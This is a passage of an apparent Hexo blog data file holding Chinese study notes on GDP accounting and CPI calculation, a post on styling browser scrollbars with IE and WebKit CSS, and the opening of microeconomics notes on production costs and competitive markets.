title=\"国民收入核算\"></a>国民收入核算</h2><ul>\n<li>GDP:国内生产总值</li>\n<li>GNP:国民生产总值</li>\n</ul>\n<blockquote>\n<p>中国诺基亚公司归芬兰人所有，该公司在中国经营得到的利润，虽是中国GDP一部分，但不被统计为中国GNP，而应归入芬兰GNP。中国海尔在美国工厂的利润，应作为美国GDP一部分，但应被统计为中国的GNP。</p>\n</blockquote>\n<ul>\n<li>NNP：国内生产净值（国内生产总值减去固定资产折旧）</li>\n<li>NI：国民收入（国民收入要加上折旧、间接税等才形成GDP）</li>\n<li>其他：<ul>\n<li>PI：个人收入</li>\n<li>PDI：个人可支配收入（PI扣除税收、养老保险等）</li>\n</ul>\n</li>\n</ul>\n<hr>\n<p><strong>地下经济</strong>：所有合法但却未申报的经济活动。</p>\n<p><strong>非市场活动</strong>：居民在家庭内生产和消费，而没有进入市场的产品与劳务的价值。</p>\n<hr>\n<p>核算方法：</p>\n<ul>\n<li>支出法<ul>\n<li>使用 消费（C），投资（I），政府购买（G），净出口（NX）<blockquote>\n<p><strong>净出口</strong>：出口减去进口得到的差额，表示本国最终产品有多少通过外国人支出而实现其市场价值。</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>收入法<ul>\n<li>使用 劳动者报酬、生产税净额、固定资产折旧、营业盈余<blockquote>\n<p><strong>生产税净额</strong>：生产税费（因为从事生产活动使用生产要素如固定资产、土地、劳动力向政府缴纳的各种税金、附加费和规费）减去生产补贴后的差额。<br><strong>固定资产折旧</strong>：为了弥补固定资产在生产过程中的价值损耗而提取的价值。</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>部门法（生产法）<ul>\n<li>依据提供产品与劳务各部门增加值计算GDP，从生产角度反映了GDP来源。政府部门劳务按其收入计算。</li>\n<li>我国现行统计制度，把国民经济分为农业，采掘业，化学工业，金融保险业等17个部门进行生产或部门法统计。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<ul>\n<li>实际GDP（Real GDP): 按基期不变价格评价的物品与劳务的产值。</li>\n<li>名义GDP（Nominal  GDP）：按现期价格计算的物品与劳务的产值。</li>\n</ul>\n<blockquote>\n<p>实际GDP排除通货膨胀等的影响</p>\n</blockquote>\n<p><strong>GDP消胀指数</strong>：用名义GDP与实际GDP的比值计算的物价水平衡量指标。</p>\n<hr>\n<p><strong>总需求</strong>（AD）：整个社会对产品与劳务需求的总和，包括</p>\n<ul>\n<li>消费：居民对产品或服务的需求或支出</li>\n<li>投资：厂商对投资品的需求或支出</li>\n<li>政府支出：政府对各种产品与服务的需求或支出</li>\n<li>净出口：外国居民对本国产品或服务的需求</li>\n</ul>\n<p><strong>总供给</strong>（AS）：全部产品与服务供给/销售的总和（用货币衡量）</p>\n<hr>\n<p><strong>物价指数</strong>：现期某些物品的价值与基期同样物品价值的比率</p>\n<p><strong>通货膨胀率</strong>：现期物价指数较前期变动的百分比。</p>\n<p><strong>消费物价指数</strong>（CPI）：是衡量消费者购买的物品与劳务的平均物价水平的物价指数。</p>\n<p>计算：</p>\n<ol>\n<li><p>固定篮子，确定选择哪些物品与劳务计算CPI，以及各种物品的权重。</p>\n<p> 4个热狗，2 个烤地瓜</p>\n</li>\n<li><p>找出各年每种物品的价格。</p>\n</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">年份</th>\n<th style=\"text-align:center\">热狗的价格（￥）</th>\n<th style=\"text-align:center\">烤地瓜的价格（￥）</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2001</td>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">2</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2002</td>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">3</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2003</td>\n<td style=\"text-align:center\">3</td>\n<td style=\"text-align:center\">4</td>\n</tr>\n</tbody>\n</table>\n<ol>\n<li>计算一篮子物品的支出</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">年份</th>\n<th style=\"text-align:center\">一篮子物品的费用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2001</td>\n<td style=\"text-align:center\">（每个热狗1￥<em>4个热狗）+ （每个烤地瓜2￥</em>2个烤地瓜）= 8￥</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2002</td>\n<td style=\"text-align:center\">（每个热狗2￥<em>4个热狗）+ （每个烤地瓜3￥</em>2个烤地瓜）=14￥</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2003</td>\n<td style=\"text-align:center\">（每个热狗3￥<em>4个热狗）+ （每个烤地瓜4￥</em>2个烤地瓜）=20￥</td>\n</tr>\n</tbody>\n</table>\n<ol>\n<li>选择某一年为基年，计算各年的CPI（以2001年为基年）</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">年份</th>\n<th style=\"text-align:center\">消费物价指数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2001</td>\n<td style=\"text-align:center\">（8/ 8）*100 = 100</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2002</td>\n<td style=\"text-align:center\">（14/ 8）*100 = 175</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2003</td>\n<td style=\"text-align:center\">（20/8）*100 = 250</td>\n</tr>\n</tbody>\n</table>\n<ol>\n<li>用消费物价指数计算自上一年来的通货膨胀率</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">年份</th>\n<th style=\"text-align:center\">通货膨胀率</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2002</td>\n<td style=\"text-align:center\">（175-100）/100= 75%</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">2003</td>\n<td style=\"text-align:center\">（250-175）/175=43%</td>\n</tr>\n</tbody>\n</table>"},{"title":"自定义浏览器滚动条","_content":"\n## 目录\n\n* IE浏览器\n* webkit内核浏览器\n\n<!-- more -->\n\n****\n\n## IE浏览器\n\n|滚动条样式\t                           \t\t |支持浏览器版本 |可否继承  |描述\t\t\t\t\t\t\t \t         |\n|----------------------------------------|:-------------------:|:-----------:|:------------------------------------------------------:|\n| scrollbar-3dlight-color    \t\t | IE5.5+\t\t        | y\t\t | 设置滚动框的和滚动条箭头左上边缘的颜色 |\n| scrollbar-highlight-color\t\t | IE5.5+ \t     \t        | y\t\t | 设置滚动框的和滚动条箭头左上边缘的颜色 |\n| scrollbar-face-color\t    \t\t | IE5.5+\t\t        | y\t\t | 设置滚动框和滚动条箭头的颜色\t\t         |\n| scrollbar-arrow-color     \t\t | IE5.5+\t\t        | y\t\t | 设置滚动条箭头的颜色\t\t\t\t         |\n| scrollbar-shadow-color              | IE5.5+\t\t        | y\t\t | 设置滚动框的和滚动条箭头右下边缘的颜色 |\n| scrollbar-dark-shadow-color\t | IE5.5+\t\t        | y\t      \t | 设置滚动条槽的颜色\t\t\t\t\t         |\n| scrollbar-base-color                    | IE5.5+\t\t        | y\t\t | 设置滚动条主要构成部分的颜色\t\t         |\n| scrollbar-track-color            \t | IE5.5+\t\t        | y\t\t | 设置滚动条轨迹组成部分的颜色\t     \t         |\n\n![ie滚动条说明](http://oo3e61qcc.bkt.clouddn.com/IEscrollbar.gif)\n\n## webkit内核浏览器\n\n        CSS\n    ::-webkit-scrollbar              { /* 1 */ }\n    ::-webkit-scrollbar-button       { /* 2 */ }\n    ::-webkit-scrollbar-track        { /* 3 */ }\n    ::-webkit-scrollbar-track-piece  { /* 4 */ }\n    ::-webkit-scrollbar-thumb        { /* 5 */ }\n    ::-webkit-scrollbar-corner       { /* 6 */ }\n    ::-webkit-resizer                { /* 7 */ }\n\n![webkit内核浏览器](http://oo3e61qcc.bkt.clouddn.com/webkitScrollbar.png)\n\n* ::-webkit-scrollbar        \t滚动条整体部分，其中的属性有width,height,background,border\t（就和一个块级元素一样）等。\n* ::-webkit-scrollbar-button   \t   滚动条两端的按钮。可以用display:none让其不显示，也可以添加背景图片，颜色改变显示效果。\n* ::-webkit-scrollbar-track         外层轨道。可以用display:none让其不显示，也可以添加背景图片，颜色改变显示效果。\n* ::-webkit-scrollbar-track-piece        内层轨道，滚动条中间部分（除去）。\n* ::-webkit-scrollbar-thumb               滚动条里面可以拖动的那部分\n* ::-webkit-scrollbar-corner               边角\n* ::-webkit-resizer                       定义右下角拖动块的样式\n\n> 注意：对以上各个部分定义width,height时。有如下功能：若是水平滚动条，则width属性不起作用，height属性用来控制滚动条相应部分竖直方向高度；若是竖直滚动条，则height属性不起作用，width属性用来控制相应部分的宽度。\n\n****\n\n****\n\np.s.拓展\n\n通过以上，我们几乎就可以来重写网站的滚动条了，但是webkit提供的还有更多的伪类，可以定制更丰富滚动条样式。本文以下内容参考：[https://www.webkit.org/blog/363/styling-scrollbars/](https://www.webkit.org/blog/363/styling-scrollbars/)\n\n* :horizontal     horizontal  伪类，主要应用于选择水平方向滚动条。\n* :vertical    vertical伪类主要是应用于选择竖直方向滚动条\n* :decrement    decrement伪类应用于按钮和内层轨道(track piece)。它用来指示按钮或者内层轨道是否会减小视窗的位置(比如，垂直滚动条的上面，水平滚动条的左边。)\n* :increment     increment伪类与和decrement类似，用来指示按钮或内层轨道是否会增大视窗的位置(比如，垂直滚动条的下面和水平滚动条的右边。)\n* :start    start伪类也应用于按钮和滑块。它用来定义对象是否放到滑块的前面。\n* :end     类似于start伪类，标识对象是否放到滑块的后面。\n* :double-button    该伪类可以用于按钮和内层轨道。用于判断一个按钮是不是放在滚动条同一端的一对按钮中的一个。对于内层轨道来说，它表示内层轨道是否紧靠一对按钮。\n* :single-button    类似于double-button伪类。对按钮来说，它用于判断一个按钮是否自己独立的在滚动条的一段。对内层轨道来说，它表示内层轨道是否紧靠一个single-button。\n* :no-button    用于内层轨道，表示内层轨道是否要滚动到滚动条的终端，比如，滚动条两端没有按钮的时候。\n* :corner-present    用于所有滚动条轨道，指示滚动条圆角是否显示。\n* :window-inactive    用于所有的滚动条轨道，指示应用滚动条的某个页面容器(元素)是否当前被激活。(在webkit最近的版本中，该伪类也可以用于::selection伪元素。webkit团队有计划扩展它并推动成为一个标准的伪类)\n> 另外，:enabled、:disabled、:hover、和:active等伪类同样在滚动条中适用。","source":"_posts/自定义浏览器滚动条.md","raw":"---\n\ntitle: 自定义浏览器滚动条\ntags: ['浏览器', 'css']\n\n---\n\n## 目录\n\n* IE浏览器\n* webkit内核浏览器\n\n<!-- more -->\n\n****\n\n## IE浏览器\n\n|滚动条样式\t                           \t\t |支持浏览器版本 |可否继承  |描述\t\t\t\t\t\t\t \t         |\n|----------------------------------------|:-------------------:|:-----------:|:------------------------------------------------------:|\n| scrollbar-3dlight-color    \t\t | IE5.5+\t\t        | y\t\t | 设置滚动框的和滚动条箭头左上边缘的颜色 |\n| scrollbar-highlight-color\t\t | IE5.5+ \t     \t        | y\t\t | 设置滚动框的和滚动条箭头左上边缘的颜色 |\n| scrollbar-face-color\t    \t\t | IE5.5+\t\t        | y\t\t | 设置滚动框和滚动条箭头的颜色\t\t         |\n| scrollbar-arrow-color     \t\t | IE5.5+\t\t        | y\t\t | 设置滚动条箭头的颜色\t\t\t\t         |\n| scrollbar-shadow-color              | IE5.5+\t\t        | y\t\t | 设置滚动框的和滚动条箭头右下边缘的颜色 |\n| scrollbar-dark-shadow-color\t | IE5.5+\t\t        | y\t      \t | 设置滚动条槽的颜色\t\t\t\t\t         |\n| scrollbar-base-color                    | IE5.5+\t\t        | y\t\t | 设置滚动条主要构成部分的颜色\t\t         |\n| scrollbar-track-color            \t | IE5.5+\t\t        | y\t\t | 设置滚动条轨迹组成部分的颜色\t     \t         |\n\n![ie滚动条说明](http://oo3e61qcc.bkt.clouddn.com/IEscrollbar.gif)\n\n## webkit内核浏览器\n\n        CSS\n    ::-webkit-scrollbar              { /* 1 */ }\n    ::-webkit-scrollbar-button       { /* 2 */ }\n    ::-webkit-scrollbar-track        { /* 3 */ }\n    ::-webkit-scrollbar-track-piece  { /* 4 */ }\n    ::-webkit-scrollbar-thumb        { /* 5 */ }\n    ::-webkit-scrollbar-corner       { /* 6 */ }\n    ::-webkit-resizer                { /* 7 */ }\n\n![webkit内核浏览器](http://oo3e61qcc.bkt.clouddn.com/webkitScrollbar.png)\n\n* ::-webkit-scrollbar        \t滚动条整体部分，其中的属性有width,height,background,border\t（就和一个块级元素一样）等。\n* ::-webkit-scrollbar-button   \t   滚动条两端的按钮。可以用display:none让其不显示，也可以添加背景图片，颜色改变显示效果。\n* ::-webkit-scrollbar-track         外层轨道。可以用display:none让其不显示，也可以添加背景图片，颜色改变显示效果。\n* ::-webkit-scrollbar-track-piece        内层轨道，滚动条中间部分（除去）。\n* ::-webkit-scrollbar-thumb               滚动条里面可以拖动的那部分\n* ::-webkit-scrollbar-corner               边角\n* ::-webkit-resizer                       定义右下角拖动块的样式\n\n> 注意：对以上各个部分定义width,height时。有如下功能：若是水平滚动条，则width属性不起作用，height属性用来控制滚动条相应部分竖直方向高度；若是竖直滚动条，则height属性不起作用，width属性用来控制相应部分的宽度。\n\n****\n\n****\n\np.s.拓展\n\n通过以上，我们几乎就可以来重写网站的滚动条了，但是webkit提供的还有更多的伪类，可以定制更丰富滚动条样式。本文以下内容参考：[https://www.webkit.org/blog/363/styling-scrollbars/](https://www.webkit.org/blog/363/styling-scrollbars/)\n\n* :horizontal     horizontal  伪类，主要应用于选择水平方向滚动条。\n* :vertical    vertical伪类主要是应用于选择竖直方向滚动条\n* :decrement    decrement伪类应用于按钮和内层轨道(track piece)。它用来指示按钮或者内层轨道是否会减小视窗的位置(比如，垂直滚动条的上面，水平滚动条的左边。)\n* :increment     increment伪类与和decrement类似，用来指示按钮或内层轨道是否会增大视窗的位置(比如，垂直滚动条的下面和水平滚动条的右边。)\n* :start    start伪类也应用于按钮和滑块。它用来定义对象是否放到滑块的前面。\n* :end     类似于start伪类，标识对象是否放到滑块的后面。\n* :double-button    该伪类可以用于按钮和内层轨道。用于判断一个按钮是不是放在滚动条同一端的一对按钮中的一个。对于内层轨道来说，它表示内层轨道是否紧靠一对按钮。\n* :single-button    类似于double-button伪类。对按钮来说，它用于判断一个按钮是否自己独立的在滚动条的一段。对内层轨道来说，它表示内层轨道是否紧靠一个single-button。\n* :no-button    用于内层轨道，表示内层轨道是否要滚动到滚动条的终端，比如，滚动条两端没有按钮的时候。\n* :corner-present    用于所有滚动条轨道，指示滚动条圆角是否显示。\n* :window-inactive    用于所有的滚动条轨道，指示应用滚动条的某个页面容器(元素)是否当前被激活。(在webkit最近的版本中，该伪类也可以用于::selection伪元素。webkit团队有计划扩展它并推动成为一个标准的伪类)\n> 另外，:enabled、:disabled、:hover、和:active等伪类同样在滚动条中适用。","slug":"自定义浏览器滚动条","published":1,"date":"2017-04-04T07:08:59.295Z","updated":"2017-04-08T16:22:54.145Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s4g000ml8slp0ivxlnj","content":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>IE浏览器</li>\n<li>webkit内核浏览器</li>\n</ul>\n<a id=\"more\"></a>\n<hr>\n<h2 id=\"IE浏览器\"><a href=\"#IE浏览器\" class=\"headerlink\" title=\"IE浏览器\"></a>IE浏览器</h2><table>\n<thead>\n<tr>\n<th>滚动条样式</th>\n<th style=\"text-align:center\">支持浏览器版本</th>\n<th style=\"text-align:center\">可否继承</th>\n<th style=\"text-align:center\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>scrollbar-3dlight-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动框的和滚动条箭头左上边缘的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-highlight-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动框的和滚动条箭头左上边缘的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-face-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动框和滚动条箭头的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-arrow-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动条箭头的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-shadow-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动框的和滚动条箭头右下边缘的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-dark-shadow-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动条槽的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-base-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动条主要构成部分的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-track-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动条轨迹组成部分的颜色</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"http://oo3e61qcc.bkt.clouddn.com/IEscrollbar.gif\" alt=\"ie滚动条说明\"></p>\n<h2 id=\"webkit内核浏览器\"><a href=\"#webkit内核浏览器\" class=\"headerlink\" title=\"webkit内核浏览器\"></a>webkit内核浏览器</h2><pre><code>    CSS\n::-webkit-scrollbar              { /* 1 */ }\n::-webkit-scrollbar-button       { /* 2 */ }\n::-webkit-scrollbar-track        { /* 3 */ }\n::-webkit-scrollbar-track-piece  { /* 4 */ }\n::-webkit-scrollbar-thumb        { /* 5 */ }\n::-webkit-scrollbar-corner       { /* 6 */ }\n::-webkit-resizer                { /* 7 */ }\n</code></pre><p><img src=\"http://oo3e61qcc.bkt.clouddn.com/webkitScrollbar.png\" alt=\"webkit内核浏览器\"></p>\n<ul>\n<li>::-webkit-scrollbar            滚动条整体部分，其中的属性有width,height,background,border    （就和一个块级元素一样）等。</li>\n<li>::-webkit-scrollbar-button          滚动条两端的按钮。可以用display:none让其不显示，也可以添加背景图片，颜色改变显示效果。</li>\n<li>::-webkit-scrollbar-track         外层轨道。可以用display:none让其不显示，也可以添加背景图片，颜色改变显示效果。</li>\n<li>::-webkit-scrollbar-track-piece        内层轨道，滚动条中间部分（除去）。</li>\n<li>::-webkit-scrollbar-thumb               滚动条里面可以拖动的那部分</li>\n<li>::-webkit-scrollbar-corner               边角</li>\n<li>::-webkit-resizer                       定义右下角拖动块的样式</li>\n</ul>\n<blockquote>\n<p>注意：对以上各个部分定义width,height时。有如下功能：若是水平滚动条，则width属性不起作用，height属性用来控制滚动条相应部分竖直方向高度；若是竖直滚动条，则height属性不起作用，width属性用来控制相应部分的宽度。</p>\n</blockquote>\n<hr>\n<hr>\n<p>p.s.拓展</p>\n<p>通过以上，我们几乎就可以来重写网站的滚动条了，但是webkit提供的还有更多的伪类，可以定制更丰富滚动条样式。本文以下内容参考：<a href=\"https://www.webkit.org/blog/363/styling-scrollbars/\" target=\"_blank\" rel=\"external\">https://www.webkit.org/blog/363/styling-scrollbars/</a></p>\n<ul>\n<li>:horizontal     horizontal  伪类，主要应用于选择水平方向滚动条。</li>\n<li>:vertical    vertical伪类主要是应用于选择竖直方向滚动条</li>\n<li>:decrement    decrement伪类应用于按钮和内层轨道(track piece)。它用来指示按钮或者内层轨道是否会减小视窗的位置(比如，垂直滚动条的上面，水平滚动条的左边。)</li>\n<li>:increment     increment伪类与和decrement类似，用来指示按钮或内层轨道是否会增大视窗的位置(比如，垂直滚动条的下面和水平滚动条的右边。)</li>\n<li>:start    start伪类也应用于按钮和滑块。它用来定义对象是否放到滑块的前面。</li>\n<li>:end     类似于start伪类，标识对象是否放到滑块的后面。</li>\n<li>:double-button    该伪类可以用于按钮和内层轨道。用于判断一个按钮是不是放在滚动条同一端的一对按钮中的一个。对于内层轨道来说，它表示内层轨道是否紧靠一对按钮。</li>\n<li>:single-button    类似于double-button伪类。对按钮来说，它用于判断一个按钮是否自己独立的在滚动条的一段。对内层轨道来说，它表示内层轨道是否紧靠一个single-button。</li>\n<li>:no-button    用于内层轨道，表示内层轨道是否要滚动到滚动条的终端，比如，滚动条两端没有按钮的时候。</li>\n<li>:corner-present    用于所有滚动条轨道，指示滚动条圆角是否显示。</li>\n<li>:window-inactive    用于所有的滚动条轨道，指示应用滚动条的某个页面容器(元素)是否当前被激活。(在webkit最近的版本中，该伪类也可以用于::selection伪元素。webkit团队有计划扩展它并推动成为一个标准的伪类)<blockquote>\n<p>另外，:enabled、:disabled、:hover、和:active等伪类同样在滚动条中适用。</p>\n</blockquote>\n</li>\n</ul>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>IE浏览器</li>\n<li>webkit内核浏览器</li>\n</ul>","more":"<hr>\n<h2 id=\"IE浏览器\"><a href=\"#IE浏览器\" class=\"headerlink\" title=\"IE浏览器\"></a>IE浏览器</h2><table>\n<thead>\n<tr>\n<th>滚动条样式</th>\n<th style=\"text-align:center\">支持浏览器版本</th>\n<th style=\"text-align:center\">可否继承</th>\n<th style=\"text-align:center\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>scrollbar-3dlight-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动框的和滚动条箭头左上边缘的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-highlight-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动框的和滚动条箭头左上边缘的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-face-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动框和滚动条箭头的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-arrow-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动条箭头的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-shadow-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动框的和滚动条箭头右下边缘的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-dark-shadow-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动条槽的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-base-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动条主要构成部分的颜色</td>\n</tr>\n<tr>\n<td>scrollbar-track-color</td>\n<td style=\"text-align:center\">IE5.5+</td>\n<td style=\"text-align:center\">y</td>\n<td style=\"text-align:center\">设置滚动条轨迹组成部分的颜色</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"http://oo3e61qcc.bkt.clouddn.com/IEscrollbar.gif\" alt=\"ie滚动条说明\"></p>\n<h2 id=\"webkit内核浏览器\"><a href=\"#webkit内核浏览器\" class=\"headerlink\" title=\"webkit内核浏览器\"></a>webkit内核浏览器</h2><pre><code>    CSS\n::-webkit-scrollbar              { /* 1 */ }\n::-webkit-scrollbar-button       { /* 2 */ }\n::-webkit-scrollbar-track        { /* 3 */ }\n::-webkit-scrollbar-track-piece  { /* 4 */ }\n::-webkit-scrollbar-thumb        { /* 5 */ }\n::-webkit-scrollbar-corner       { /* 6 */ }\n::-webkit-resizer                { /* 7 */ }\n</code></pre><p><img src=\"http://oo3e61qcc.bkt.clouddn.com/webkitScrollbar.png\" alt=\"webkit内核浏览器\"></p>\n<ul>\n<li>::-webkit-scrollbar            滚动条整体部分，其中的属性有width,height,background,border    （就和一个块级元素一样）等。</li>\n<li>::-webkit-scrollbar-button          滚动条两端的按钮。可以用display:none让其不显示，也可以添加背景图片，颜色改变显示效果。</li>\n<li>::-webkit-scrollbar-track         外层轨道。可以用display:none让其不显示，也可以添加背景图片，颜色改变显示效果。</li>\n<li>::-webkit-scrollbar-track-piece        内层轨道，滚动条中间部分（除去）。</li>\n<li>::-webkit-scrollbar-thumb               滚动条里面可以拖动的那部分</li>\n<li>::-webkit-scrollbar-corner               边角</li>\n<li>::-webkit-resizer                       定义右下角拖动块的样式</li>\n</ul>\n<blockquote>\n<p>注意：对以上各个部分定义width,height时。有如下功能：若是水平滚动条，则width属性不起作用，height属性用来控制滚动条相应部分竖直方向高度；若是竖直滚动条，则height属性不起作用，width属性用来控制相应部分的宽度。</p>\n</blockquote>\n<hr>\n<hr>\n<p>p.s.拓展</p>\n<p>通过以上，我们几乎就可以来重写网站的滚动条了，但是webkit提供的还有更多的伪类，可以定制更丰富滚动条样式。本文以下内容参考：<a href=\"https://www.webkit.org/blog/363/styling-scrollbars/\">https://www.webkit.org/blog/363/styling-scrollbars/</a></p>\n<ul>\n<li>:horizontal     horizontal  伪类，主要应用于选择水平方向滚动条。</li>\n<li>:vertical    vertical伪类主要是应用于选择竖直方向滚动条</li>\n<li>:decrement    decrement伪类应用于按钮和内层轨道(track piece)。它用来指示按钮或者内层轨道是否会减小视窗的位置(比如，垂直滚动条的上面，水平滚动条的左边。)</li>\n<li>:increment     increment伪类与和decrement类似，用来指示按钮或内层轨道是否会增大视窗的位置(比如，垂直滚动条的下面和水平滚动条的右边。)</li>\n<li>:start    start伪类也应用于按钮和滑块。它用来定义对象是否放到滑块的前面。</li>\n<li>:end     类似于start伪类，标识对象是否放到滑块的后面。</li>\n<li>:double-button    该伪类可以用于按钮和内层轨道。用于判断一个按钮是不是放在滚动条同一端的一对按钮中的一个。对于内层轨道来说，它表示内层轨道是否紧靠一对按钮。</li>\n<li>:single-button    类似于double-button伪类。对按钮来说，它用于判断一个按钮是否自己独立的在滚动条的一段。对内层轨道来说，它表示内层轨道是否紧靠一个single-button。</li>\n<li>:no-button    用于内层轨道，表示内层轨道是否要滚动到滚动条的终端，比如，滚动条两端没有按钮的时候。</li>\n<li>:corner-present    用于所有滚动条轨道，指示滚动条圆角是否显示。</li>\n<li>:window-inactive    用于所有的滚动条轨道，指示应用滚动条的某个页面容器(元素)是否当前被激活。(在webkit最近的版本中，该伪类也可以用于::selection伪元素。webkit团队有计划扩展它并推动成为一个标准的伪类)<blockquote>\n<p>另外，:enabled、:disabled、:hover、和:active等伪类同样在滚动条中适用。</p>\n</blockquote>\n</li>\n</ul>"},{"title":"第四讲——生产者决策","_content":"\n> 明天考选修，贴个[哭]\n\n<!-- more -->\n\n# 第七章 生产成本\n\n## 机会成本\n\n会计：显性成本\n经济学家：隐性成本 +显性成本\n\n例子\n\n办公室的均衡租金上涨了$500/每月 \n在以下情形下，比较对会计利润与经济利润的影响：\na.\t你租用办公室\nb.  你自己拥有办公室\n\n> 办公室的均衡租金上涨了$500/每月 \n>\n> a. 你租用办公室\n>    显性成本增加了$500/每月。会计利润与经济利润都减少了$500/每月 \n>\n> b. 你自己拥有办公室\n>    显性成本没有变化，因此会计利润也不会变。隐性成本增加了$500/每月（使用你办公室的机会成本是租用它的价格），因此经济利润减少了$500/每月\n\n## 生产函数\n\n在一定技术水平下，生产要素的数量和某种组合与它所能生产出来的最大产量之间依存关系的函数。\n\n* 总产量（TP）\n* 平均产量（AP）\n* 边际产量（MP）\n* 实际生产量（Q）\n\n=> \n\n边际常量递减规律（边际收益递减规律）\n\n> 在技术不变情况下， 其他生产要素投入不变，某种生产要素的增加最初使产量增加，但增加超过一定限度时，增加的产量将要递减，最终还会使产量绝对降低。\n\n## 成本函数\n\n* 总成本（TC）\n    * 固定成本（FC）：不随着产量变动而变动的成本（如设备成本，租金成本）\n    * 可变成本（VC）：随着产量变动而变动的成本（如劳动力成本，原材料成本）\n* 边际成本（MC）\n* 平均总成本（ATC）：`TC / Q`\n* 平均固定成本（AFC）：`FC / Q`\n* 平均可变成本（AVC）：`VC / Q`\n\n### 有效规模\n\n使平均总成本最小的产量\n\n边际成本曲线与平均总成本曲线相交于有效规模点\n\n### 生产规模\n\n* 规模经济：长期平均总成本随产量增加而减少\n* 规模不经济：长期平均总成本随产量增加而增加\n\n# 第八章 完全竞争市场\n\n## 竞争企业的收益\n\n* 总收益（TR）：`P * Q`\n* 平均收益（AR）：`AR = TR / Q = P`\n* 边际收益（MR）\n\n> 完全竞争市场中，对于一个竞争企业而言： `MR = P` \n> 作为价格接受者，一个竞争企业能够增加它的产量，而不影响市场价格\n\n## 利润最大化与竞争企业的供给曲线\n\n### 利润最大化\n\n考虑MR与MC的关系，二者相等时为利润最大化的产量\n\n> `MR = P`为一条水平线，MC为一条斜率为正的线\n\n### 停止营业与退出市场\n\n* 停止营业：仍支付固定成本\n* 退出市场：没有任何成本\n\n#### 沉没成本\n\n已经发生而且无法收回的成本\n\n> 固定成本是一种沉没成本：无论企业决定生产或停止营业，都必须支付固定成本\n> 沉没成本应该与决策无关：无论做怎样的决策，都必须支付它们\n\n#### 停止营业\n\n* 成本：收益损失（TR）\n* 收益：节约成本（VC）\n\n若`TR < 